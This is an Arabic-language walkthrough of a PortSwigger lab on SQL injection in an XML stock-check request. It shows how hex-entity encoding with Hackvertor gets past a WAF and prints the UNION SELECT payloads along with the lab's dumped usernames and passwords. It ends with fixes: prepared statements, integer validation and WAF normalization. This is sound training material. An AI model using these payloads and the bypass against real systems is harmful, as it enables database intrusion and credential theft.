# [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` لمعرفة كلمة مرور حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0a8f00ea030932d68127664a00d70057.web-security-academy.net
Cookie: session=9qc2OfZt6a2y9g72pSVscilWiihkkiwE

<?xml version="1.0" encoding="UTF-8"?
>
	<stockCheck
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

سنجرب حقن `1+1` داخل `storeId`
`<storeId>1+1</storeId>`

ونقوم بإرساله لنجد أن الطلب قد مر وتم عرض عدد الوحدات `Units` في متجر أخر، وهذا يعنى أن المُدخل الذي قمنا بإرساله قد تم تحليله وتنفيذه ككود أو كتعبير برمجي `Expression`، ولم يتم التعامل معه كنص عادي `Plain Text`.

والأن سنحاول معرفة عدد الأعمدة الذي يتم إعادتها في الاستعلام الأصلي، لذلك سنقوم بحقن هذا الأمر
`<storeId>1 UNION SELECT NULL</storeId>`

ولكن سنجد أن الاستجابة كالتالي:
```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```
والتي تعنى أن هناك هجوم قد تم رصده ومنعه عن طريق الـ `WAF`.

لذلك سنقوم بتخطيه عن طريق إضافة **[Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)** كالتالي: 

`highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.`

وسنجد أن الأمر التالي قد مر من الـ `WAF`

`<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>`

وعندما سنحاول زيادة `NULL` أخرى سنجد ان النتيجة هي `0 Units` وهذا يعنى أن الأعمدة التي يتم إرجاعها هي واحد فقط.

ولذلك سنقوم بحقن الأمر التالي مع اللجوء إلى حيلة دمج عمودين في عمود واحد بإضافة رمز `~` بينهما.

`<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`

لنجد أن الاستجابة ناجحة وتحتوي عل الأسماء وكلمات المرور
```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=xeqaThy8xgkg8LqLmdWsDBtpYQdDzNQi; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 100

carlos~pinvqvetm80ggd1db8h3
591 units
administrator~7c0kmvj5sy5uonrh95jb
wiener~xqgelhep7egymtuxmifd
```

وأخيرًا سنقوم بتسجيل الدخول إلى حساب `administrator:7c0kmvj5sy5uonrh95jb` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب أن يعتمد تطبيق الويب بشكل أساسي على الاستعلامات المجهزة `Prepared Statements` لفصل هيكل استعلام `SQL` عن البيانات المدخلة، بحيث لا يتم دمج مدخلات المستخدم (المستخرجة من طلب الـ `XML`) مباشرة داخل الاستعلام، بل يتم إرسالها كبيانات منفصلة لكي تتعامل معها قاعدة البيانات كنص عادي وليس كأوامر برمجية قابلة للتنفيذ.

ويجب التحقق من نوع مدخلات المستخدم `Type Validation` وتنقيتها قبل تمريرها إلى قاعدة البيانات، وبما أن المعلمات `Parameters` المستخدمة في هذا الطلب مثل `productId` و `storeId` من المفترض أن تكون أرقاماً صحيحة `Integers` فقط، فيجب على التطبيق تحويل هذه المدخلات برمجياً إلى أرقام `Type Casting` بمجرد استخراجها، بحيث لا يتم قبول أي مدخل يحتوي على نصوص أو رموز مثل `UNION SELECT`، ويقوم التطبيق برفض الطلب فورا إذا كان المدخل غير صالح.

ويجب ضبط إعدادات الـ `WAF` ليقوم بعملية تسوية ومعالجة مسبقة للبيانات `Data Normalization` قبل فحصها، بحيث يتولى الـ `WAF` فك تشفير كيانات الـ `XML` مثل `Hex Entities` وتحويلها إلى نصها الأصلي أولاً، ومن ثم يقوم بفحص هذا النص للبحث عن أي أوامر خبيثة، لكي يضمن اكتشاف الهجوم ومنعه.
